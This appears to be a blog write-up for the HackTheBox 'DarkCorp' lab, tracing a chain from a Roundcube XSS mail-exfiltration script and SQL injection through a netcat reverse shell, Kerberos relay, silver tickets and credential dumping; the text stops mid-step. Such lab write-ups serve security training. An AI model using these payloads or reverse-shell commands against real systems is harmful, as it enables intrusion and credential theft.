---
title:  "DarkCorp (Insane)"
seo_title: "Writeup for the HackTheBox DarkCorp Machine"
date:   2025-10-18T21:00
categories: ['HackTheBox', 'Windows', 'Active-Directory']
---

![](/assets/images/headers/DarkCorp.png)

# Synopsis

## Reconnaissance
We start with a quick nmap scan and see that there are only two ports open.

```
Nmap scan report for 10.10.11.54
Host is up (0.035s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
80/tcp open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We also see that this is a linux host although the challenge is Windows (AD) based. Looks like we are in for a treat! Navigating to the website redirects us to `http://drip.htb`. After adding this to our `/etc/hosts` file we can view the site.

![](/assets/images/writeups/darkcorp/dripmail-index.png)

From the website, we see that the site allows us to sign-up for DripMail, an e-mail solution powered by Roundcube. Roundcube is a browser-based multilingual IMAP client with an application-like user interface. We can create an account using the sign up form.

![](/assets/images/writeups/darkcorp/dripmail-register.png)

When we try to go to the sign-in page, it redirects to `http://mail.drip.htb` which we can also add to our hosts file. Once logged in, we receive a welcome e-mail from `no-reply@drip.htb`. Next we check the Roundcube version by clicking on the about button at the bottom-left corner.

![](/assets/images/writeups/darkcorp/dripmail-version.png)

## Foothold
When researching for this specific version, we find a blog post from [Sonar](https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/) that goes over a critical XSS vulnerability in Roundcube (CVE-2024-42009 and CVE-2024-42008). The blog post talks about improperly sanitized HTLM content. An example of an XSS payload is given by the authors:

```html
<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar">
  Foo
</body>
```

This simple email body is enough to execute JavaScript in the victim's browser and access their emails. The question is what can we do with this? We can use this vulnerability to send e-mails to unsuspecting users and target a specific URL to read their private e-mails. When hovering over our email we see the following link:

```
http://mail.drip.htb/?_task=mail&_mbox=INBOX&_uid=1&_action=show
```

The UID value is the ID of the mail, so by sending the following XSS payload, we can read the contents of the email.

```python
uid = 1
payload = (
  f'<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&_action=show&_uid={uid}&_mbox=INBOX&_extwin=1\').then(r=>r.text()).then(t=>fetch(`http://10.10.14.11:1337/?c=${btoa(t)}`)) foo=bar>'
)
```

This will Base64 encode the email contents of the UID specified and send it to our machine. But to who are we sending this payload to? Lets start enumerating further. Back on the main website, we can send a mail to support. We will intercept this request with BurpSuite and see what it does.

![](/assets/images/writeups/darkcorp/dripmail-support.png)

In the request, we see that it hardcodes the recipient. 
![](/assets/images/writeups/darkcorp/dripmail-support-mail.png)

We can change this to our own and look at the email it sends.

![](/assets/images/writeups/darkcorp/dripmail-support-bcase.png)

The mail is delivered to our inbox and we also find a potential user in the message body. Now that we have a target, we can write our initial exploit.

```python
import threading,argparse,time,requests,base64
from bs4 import BeautifulSoup
from http.server import BaseHTTPRequestHandler, HTTPServer

parser = argparse.ArgumentParser()
parser.add_argument("-m", "--message", type=int, dest="message", required=True, help="Message UID")
parser.add_argument("-i", "--ip", dest="ip", required=True, help="Attacker IP")
parser.add_argument("-p", "--port", type=int, dest="port", required=True, help="Attacker Port")
parser.add_argument("-t", "--target", dest="target", required=True, help="Email form to target")
args = parser.parse_args()

# config
LHOST = args.ip
LPORT = args.port
TARGET_URL = args.target

payload = (
    f'<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes '
    f'onanimationstart=fetch(\'/?_task=mail&_action=show&_uid={args.message}&_mbox=INBOX&_extwin=1\')'
    '.then(r=>r.text()).then(t=>fetch(`http://PLACEHOLDER/c=${btoa(t)}`)) foo=bar>'.replace("PLACEHOLDER", f"{LHOST}:{LPORT}")
)

post_data = {
    "name": "Support",
    "email": "support@drip.com",
    "message": payload,
    "content": "html",
    "recipient": "bcase@drip.htb"
}

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if '/c=' in self.path:
            encoded = self.path.split('/c=')[1]
            decoded = base64.b64decode(encoded).decode('utf-8', 'ignore')
            soup = BeautifulSoup(decoded, 'html.parser')
            messagebody_div = soup.find('div', id='messagebody')
            if messagebody_div:
                print("\n[+] Captured Email Content:")
                print(messagebody_div.decode_contents())
            else:
                print("\n[-] No messagebody div found")
        else:
            print("[!] Received request but no data found.")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    def log_message(self, format, *args):
        return

def send_mail():
    response = requests.post(TARGET_URL, data=post_data)
    print(f"[+] POST request sent! Status Code: {response.status_code}")

send_mail()

def start_server():
    server_address = (LHOST, LPORT)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"[*] Listening on port {LPORT}...\n")
    httpd.serve_forever()

listener_thread = threading.Thread(target=start_server, daemon=True)
listener_thread.start()

try:
    while True: 
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopping...")
```

This script will send our XSS payload, start a listener on the specified port and send an email to our victim in order to read the message with the specified UID. When this user clicks on the e-mail, it will retrieve the contents. Let's run our exploit to target the second message (after the welcome mail).

```console
$ python exploit.py --ip 10.10.14.11 --port 1337 --target http://drip.htb/contact --message 2
[+] POST request sent! Status Code: 200
[*] Listening on port 1337...


[+] Captured Email Content:
<div class="message-part" id="message-part1"><div class="pre">Hey Bryce,<br/>
<br/>
The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.<br/>
<br/>
You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.<br/>
<br/>
If you encounter any issues or have feedback, let me know so I can address them promptly.<br/>
<br/>
Thanks<br/>
</div></div>
```

The message states there is an analytics dashboard live at `dev-a3f1-01.drip.htb`. Again, we add it to our hosts file and have a look.

![](/assets/images/writeups/darkcorp/dev-denied.png)

We don't have access to go to this page. But since we can read mails of `bcase`, we can try to reset their password and quickly read the reset code in order to steal their account. 

![](/assets/images/writeups/darkcorp/dev-reset-pass.png)

No we run our exploit again and target the third message:

```console
$ python exploit.py --ip 10.10.14.11 --port 1337 --target http://drip.htb/contact --message 3
[+] POST request sent! Status Code: 200
[*] Listening on port 1337...


[+] Captured Email Content:
<div class="message-part" id="message-part1"><div class="pre">Your reset token has generated. Please reset your password within the next 5 minutes.<br/>
<br/>
You may reset your password here: <a href="http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z7HHlA.r7jQLiFSqkwZntB2kJLOMhUOUJ0" rel="noreferrer" target="_blank">http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z7HHlA.r7jQLiFSqkwZntB2kJLOMhUOUJ0</a><br/>
</div></div>
```

We can use this link to reset the password and login. Once we are on the dashboard, there is only one functionality that sticks out and that is the search function.

![](/assets/images/writeups/darkcorp/dev-search.png)

A quick test shows it is vulnerable to SQL Injection and it is a Postgresql database. 

![](/assets/images/writeups/darkcorp/dev-sqli.png)

We can go ahead and dump the database contents and get the password hashes of all users.
![](/assets/images/writeups/darkcorp/dev-sqli2.png)

We discover a new user (`ebelford`), but none of the hashes are crackable. We can also try to read files on the server using the `pg_read_file` system function of Postgres.

![](/assets/images/writeups/darkcorp/dev-sqli3.png)

We just need to figure out some interesting files to read. Postgresql 15 usually stores its log files at `/var/log/postgresql/postgresql-15-main.log`. While this log had nothing interesting in it, I started looking at the old log file instead and found some interesting stuff.

```
'';SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0, 100000);
```

![](/assets/images/writeups/darkcorp/dev-sqli4.png)

The old logs contain a password hash for `ebelford` that we are able to crack.

```console
$ hashcat -m 0 8bbd7f88841b4223ae63c8848969be86 $ROCKYOU
8bbd7f88841b4223ae63c8848969be86:ThePlague61780

$ ssh ebelford@drip.htb
ebelford@drip.htb's password:ThePlague61780
ebelford@drip:~$ 
```

## User
After connecting via SSH, we can look for intersting files in the `/var/www` directory. The below script will search for some common configuration files with interesting keywords:

```console
ebelford@drip:/var/www$ for i in $(find . -type f \( -name '*.php' -o -name '*.xml' -o -name '*.py' -o -name '.env' \) -exec grep -li "pass\|database" {} + 2>/dev/null | grep -v "lib" | grep "conf\|database\|pass\|setting\|env"); do echo -e $i; grep -i --color=always "pass" $i | grep -v "\#"; echo; done

./html/dashboard/.env
DB_PASS=2Qa2SsBkQvsc
MAIL_PASSWORD = None

<SNIP>
```

We see a password in a `.env` files. Further inspecting it reveals the credentials of the `postgres_dba` user.

```console
ebelford@drip:/var/www$ cat html/dashboard/.env  | grep DB
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432
```

We now login to Postgresql with these credentials.

```console
ebelford@drip:~$ PGPASSWORD=2Qa2SsBkQvsc psql -h localhost -U dripmail_dba -d dripmail
dripmail=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.11 4444 > /tmp/f';

$ nc -nvlp 4444
```

After executing the query, we receive a shell as the postgres user. Enumerating further, we find backups in the `/var/backups/postgres` folder of the `dripmail` database. It is encrypted with GPG, but we can try to decrypt it with the same database password.

```console
postgres@drip:/var/backups/postgres$ ls -la
ls -la
total 12
drwx------ 2 postgres postgres 4096 Feb 16 06:08 .
drwxr-xr-x 3 root     root     4096 Feb 16 05:36 ..
-rw-r--r-- 1 postgres postgres 1784 Feb  5 12:52 dev-dripmail.old.sql.gpg

postgres@drip:/var/backups/postgres$ gpg --homedir /var/lib/postgresql/.gnupg --pinentry-mode=loopback --passphrase '2Qa2SsBkQvsc' --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > /var/backups/postgres/dev-dripmail.old.sql

postgres@drip:/var/backups/postgres$ cat dev-dripmail.old.sql
<SNIP>
COPY public."Admins" (id, username, password, email) FROM stdin;
1       bcase   dc5484871bc95c4eab58032884be7225        bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
<SNIP>
```

We decrypted the old database and found another user (`victor.r`) with a password hash that can be cracked offline:

```console
$ hashcat -m 0 cac1c7b0e7008d67b6db40c03e76b9c0 $ROCKYOU
cac1c7b0e7008d67b6db40c03e76b9c0:victor1gustavo@#
```

Next we do a ping sweep on this host to find two more servers on the internal network.

```console
ebelford@drip:~$ for i in $(seq 254); do ping 172.16.20.${i} -c1 -W1 & done | grep from
64 bytes from 172.16.20.3: icmp_seq=1 ttl=64 time=0.049 ms
64 bytes from 172.16.20.2: icmp_seq=1 ttl=128 time=2.07 ms
64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=6.35 ms
```

We are on `172.16.20.3` and we can guess the `172.16.20.1` is the Domain Controller. We now use Ligolo-ng to pivot into the internal network.

```console
$ scp agent ebelford@drip.htb:/home/ebelford
$ sudo ip tuntap add user $USER mode tun ligolo
$ sudo ip link set ligolo up
$ sudo ip route add 172.16.20.0/24 dev ligolo

ebelford@drip:~$ ./agent -connect 10.10.14.11:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.14.11:11601"

$ ./proxy -selfcert -laddr 0.0.0.0:11601
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!

ligolo-ng » INFO[0007] Agent joined.                                 name=ebelford@drip remote="10.10.11.54:56344"
ligolo-ng » session
? Specify a session : 1 - #1 - ebelford@drip - 10.10.11.54:56344
[Agent : ebelford@drip] » start
[Agent : ebelford@drip] » INFO[0014] Starting tunnel to ebelford@drip           
```

## WEB-01 Enumeration
After our pivot we are able to reach `172.16.20.2` (add WEB-01 to `/etc/hosts`) and only two ports are open (80 and 5000). Port 80 is a default IIS page, but on port 5000 we have a Basic Auth login prompt where we can login with Victor's credentials.

![](/assets/images/writeups/darkcorp/web-01-status.png)

This is a real time monitoring dashboard for various servers and databases in the network. Only WEB-01 is operational and intercepting the request with BurpSuite shows that it uses NTLM in the authorization header.

![](/assets/images/writeups/darkcorp/web-01-ntlm.png)

## DC-01 Enumeration
The DC has both port 80 and 443 open. When doing a quick dirsearch on port 443, it reveals that the AD CS web enrollment endpoint is reachable.

```console
$ dirsearch -u https://172.16.20.1
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: https://172.16.20.1/

[14:33:42] Starting: 
[14:33:54] 301 -  157B  - /aspnet_client  ->  https://172.16.20.1/aspnet_client/
[14:33:54] 403 -    1KB - /aspnet_client/
[14:33:54] 404 -    2KB - /asset..
[14:33:55] 403 -    1KB - /certenroll/
[14:33:55] 401 -    1KB - /certsrv/
```

We can check if it is vulnerable to any coercion attacks:

```bash
$ nxc smb dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -M coerce_plus
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
COERCE_PLUS 172.16.20.1     445    DC-01            VULNERABLE, DFSCoerce
COERCE_PLUS 172.16.20.1     445    DC-01            VULNERABLE, PetitPotam
COERCE_PLUS 172.16.20.1     445    DC-01            VULNERABLE, MSEven
```

The output reveals that the Domain Controller is vulnerable to PetitPotam. Also `WEB-01` shows the same result, with an additional PrinterBug vulnerability.

```bash
$ nxc smb web-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' -M coerce_plus
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PetitPotam
COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, PrinterBug
COERCE_PLUS 172.16.20.2     445    WEB-01           VULNERABLE, MSEven
```

The article [Relaying kerberos over SMB using krbrelayx](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) discusses a method to relay Kerberos authentication over SMB, a technique previously considered impossible. This approach leverages the CredMarshalTargetInfo function to manipulate Service Principal Names (SPNs), enabling attackers to redirect authentication requests to a malicious server. By registering a specifically crafted DNS record, an attacker can coerce a client into requesting a Kerberos ticket for a legitimate service but connecting tot the attacker's server instead. This method an be used to relay authentication to services like ADCS, potentially allowing unauthorized access or privilege escalation within a target network.

In kerberos the `CredMarshalTargetInfo` function plays a crucial role in the Kerberos authentication process. It serializes credential target information into a specific format, which is then appended to SPNs. This serialization ensures that when a client requests access to a service, the authentication system accurately identifies and processes the target service's credentials.

The idea here is to perform a Kerberos relay attack on the ADCS web enrollment endpoint. This allows us to request a certificate for the `WEB-01$` machine account (a.k.a. ESC8).

!!!info
This is possible since LDAP signing is disabled on the domain controller.
!!!

First we need to add a marshaled DNS entry using `ntlmrelayx`.

```console
$ sudo ntlmrelayx.py -t "ldaps://172.16.20.1" --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' 10.10.14.11
[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /
[-] HTTPD(80): Exception in HTTP request handler: cannot access local variable 'token' where it is not associated with a value
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Connection from 10.10.11.54 controlled, attacking target ldaps://172.16.20.1
[*] HTTPD(80): Client requested path: /
[*] HTTPD(80): Authenticating against ldaps://172.16.20.1 as DARKCORP/SVC_ACC SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[*] Checking if domain already has a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` DNS record
[*] Domain does not have a `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` record!
[*] Adding `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` pointing to `10.10.14.11` at `DC=dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA,DC=darkcorp.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=darkcorp,DC=htb`
[*] Added `A` record `dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`. DONT FORGET TO CLEANUP (set `dNSTombstoned` to `TRUE`, set `dnsRecord` to a NULL byte)
```

Next we let Victor coerce an NTLM authentication to us. We should get the response as shown above.

```bash
$ curl 'http://172.16.20.2:5000/status' -X POST --json '{"protocol":"http","host":"web-01.darkcorp.htb","port":"@10.10.14.11:80"}' -u 'victor.r:victor1gustavo@#' --ntlm
```

Next we kill our `ntlmrelayx` session and start `krbrelayx` to relay the request from the `WEB-01$` machine account to us. With `PetitPotam` we provoke `WEB-01$` to reachout to our marshalled DNS host and provoke the authentication in order to relay it to the certificate server (DC-01).

```bash
$ sudo python3 krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB-01$' --interface-ip 10.10.14.11
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 10.10.11.54
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 10.10.11.54
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 5
[*] Writing PKCS#12 certificate to ./WEB-01$.pfx
[*] Certificate successfully written to file
[*] Skipping user WEB-01$ since attack was already performed

$ python PetitPotam.py -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb 'dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' web-01

Trying pipe lsarpc
[-] Connecting to ncacn_np:web-01[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

In the output, we see that we got a certificate `WEB-01$.pfx` back. Let's use this certificate to get the NTLM hash of the machine account.

```console
$ gettgtpkinit.py -cert-pfx 'WEB-01$.pfx' 'darkcorp.htb/web-01$' WEB-01.ccache
2025-02-15 19:06:46,012 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-02-15 19:06:46,269 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-02-15 19:06:46,402 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-02-15 19:06:46,402 minikerberos INFO     70973acab739bebbb5bd7c22d23bbe4e31a1e1ecc7c3ca1797e5618ae3c87d96
INFO:minikerberos:70973acab739bebbb5bd7c22d23bbe4e31a1e1ecc7c3ca1797e5618ae3c87d96
2025-02-15 19:06:46,405 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

$ KRB5CCNAME=WEB-01.ccache python ~/Tools/Python/PKINITtools/getnthash.py -key 70973acab739bebbb5bd7c22d23bbe4e31a1e1ecc7c3ca1797e5618ae3c87d96 'darkcorp.htb/WEB-01$'
Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
8f33c7fc7ff515c1f358e488fbb8b675
```

Now it's time to forge a Silver Ticket. For a Silver Ticket we need several elements:
1. Domain Name
2. Domain SID
3. Username to Impersonate
4. Machine Account (service) FQDN and hash

The only thing we are missing is the Domain SID, which we can get via NetExec.

```console
$ nxc ldap dc-01.darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --get-sid
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@#
LDAP        172.16.20.1     389    DC-01            Domain SID S-1-5-21-3432610366-2163336488-3604236847
```

Now we use `ticketer.py` to forge our Silver Ticket.

```console
$ ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -domain darkcorp.htb -spn cifs/web-01.darkcorp.htb Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for darkcorp.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache

$ KRB5CCNAME=Administrator.ccache smbclient.py -k -no-pass WEB-01.darkcorp.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# use c$
# cd Users
# cd Administrator/Desktop
# cat user.txt
4427628b0503779c37ddf30baea9c23b
```

After dumping the system credentials, we can also use WinRM to connect to WEB-01.

```console
$ secretsdump.py -hashes ':8f33c7fc7ff515c1f358e488fbb8b675' 'web-01$'@web-01.darkcorp.htb

$ evil-winrm -i web-01.darkcorp.htb -u Administrator -H '88d84ec08dad123eb04a060a74053f21'
```

## Root

### BloodHound Enumeration

We use [Rusthound](https://github.com/g0h4n/RustHound-CE) to get a sense of the AD environment with the credentials of victor. We can compile the release version from docker and run it.

```console
$ docker build --rm -t rusthound-ce .
$ docker run --rm -v $PWD:/usr/src/rusthound-ce rusthound-ce release
$ ./rusthound-ce -u victor.r@darkcorp.htb -p 'victor1gustavo@#' -c All -d darkcorp.htb --zip
```

![](/assets/images/writeups/darkcorp/BH-victor.png)

From Bloodhound we don't see any interesting permissions. Since we have administrator access on `WEB-01`, we can try to extract more information from the host.

For this we use `DonPAPI`, a post-exploitation tool to extract and decrypt credentials stored by Windows Data Protection API (DPAPI). It helps attackers or security researchers to recover saved passwords, browser credentials, RDP sessions, and private keys from compromised Windows machines.

```console
$ donpapi collect -u Administrator -H 88d84ec08dad123eb04a060a74053f21 -t web-01.darkcorp.htb
[web-01.darkcorp.htb] [+] Starting gathering credz
[web-01.darkcorp.htb] [+] Dumping SAM
[web-01.darkcorp.htb] [$] [SAM] Got 4 accounts
[web-01.darkcorp.htb] [+] Dumping LSA
[web-01.darkcorp.htb] [+] Dumping User and Machine masterkeys
[web-01.darkcorp.htb] [$] [DPAPI] Got 4 masterkeys
[web-01.darkcorp.htb] [+] Dumping User Chromium Browsers
[web-01.darkcorp.htb] [+] Dumping User and Machine Certificates
[web-01.darkcorp.htb] [+] Dumping User and Machine Credential Manager
[web-01.darkcorp.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!

$ donpapi collect -u Administrator -p 'But_Lying_Aid9!' -t web-01.darkcorp.htb -c CredMan
[💀] [+] DonPAPI Version 2.0.1
[💀] [+] Output directory at /home/s3rp3nt/.donpapi
[💀] [+] Loaded 1 targets
[💀] [+] Recover file available at /home/s3rp3nt/.donpapi/recover/recover_1739875375
[web-01.darkcorp.htb] [+] Starting gathering credz
[web-01.darkcorp.htb] [+] Dumping SAM
[web-01.darkcorp.htb] [$] [SAM] Got 4 accounts
[web-01.darkcorp.htb] [+] Dumping LSA
[web-01.darkcorp.htb] [+] Dumping User and Machine masterkeys
[web-01.darkcorp.htb] [$] [DPAPI] Got 5 masterkeys
[web-01.darkcorp.htb] [+] Dumping User and Machine Credential Manager
[web-01.darkcorp.htb] [$] [CredMan] [Administrator] LegacyGeneric:target=WEB-01 - Administrator:Pack_Beneath_Solid9!
[web-01.darkcorp.htb] [$] [CredMan] [SYSTEM] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
```

Now we can do a password spray on the domain to discover access to another user account.

```console
$ nxc smb web-01.darkcorp.htb -u users.txt -p 'Pack_Beneath_Solid9!'
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\john.w:Pack_Beneath_Solid9!
```

![](/assets/images/writeups/darkcorp/BH-john-angela.png)

We can use this account to make shadow credentials for angela.w.

```console
$ certipy shadow auto -u 'john.w@darkcorp.htb' -p 'Pack_Beneath_Solid9!' -account angela.w
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'angela.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9bcf898b-5a82-a51f-7808-b271995065c5'
[*] Adding Key Credential with device ID '9bcf898b-5a82-a51f-7808-b271995065c5' to the Key Credentials for 'angela.w'
[*] Successfully added Key Credential with device ID '9bcf898b-5a82-a51f-7808-b271995065c5' to the Key Credentials for 'angela.w'
[*] Authenticating as 'angela.w' with the certificate
[*] Using principal: angela.w@darkcorp.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'angela.w.ccache'
[*] Trying to retrieve NT hash for 'angela.w'
[*] Restoring the old Key Credentials for 'angela.w'
[*] Successfully restored the old Key Credentials for 'angela.w'
[*] NT hash for 'angela.w': 957246c8137069bca672dc6aa0af7c7a
```

After getting root on `web-01`, we can abuse the [UserPrincipalName](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) to login to the linux box as admin. Essentially, in Linux it uses either the SAMAccountName or the UPN to login. When we create a ticket and specify the `NT_ENTERPRISE` it is going to use the UPN so we can bypass a unique constraint over the UPN (since the SAMAccountName is fixed).


We set `angela.w`'s UPN to `angela.w.adm` using bloodyAD and solicit a new TGT of principal type `NT_ENTERPRISE`.

```console
$ bloodyAD --host dc-01 -d darkcorp.htb -u john.w -p 'Pack_Beneath_Solid9!' set object 'CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb' userPrincipalName -v angela.w.adm
[+] CN=Angela Williams,CN=Users,DC=darkcorp,DC=htb userPrincipalName has been updated

$ getTGT.py -hashes ':957246c8137069bca672dc6aa0af7c7a' -principalType NT_ENTERPRISE darkcorp.htb/angela.w.adm
Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
[*] Saving ticket in angela.w.adm.ccache

$ scp ./angela.w.adm.ccache ebelford@drip.htb:/tmp

ebelford@drip:/tmp$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
Authenticated angela.w.adm@DARKCORP.HTB
Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful
Changing uid to angela.w.adm (1730401107)
angela.w.adm@drip:/tmp$ sudo su
```

With root access we can dump cached credentials.

```console
root@drip:/tmp# cd /var/lib/sss/db
root@drip:/tmp# strings cache_darkcorp.htb.ldb | grep cached -A 1
cachedPassword
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
cachedPasswordType
lastCachedPasswordChange
--
cachedPassword
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
cachedPasswordType
lastCachedPasswordChange

$ hashcat -m 1800 hash_taylor $ROCKYOU
```

We then crack the password of `taylor.b.adm:!QAZzaq1`.

![](/assets/images/writeups/darkcorp/BH-taylor.png)

Taylor is part of GPO managers and we can abuse this to get domain admin. This group has `WriteDACL` over the `SecurityUpdates` GPO.

```console
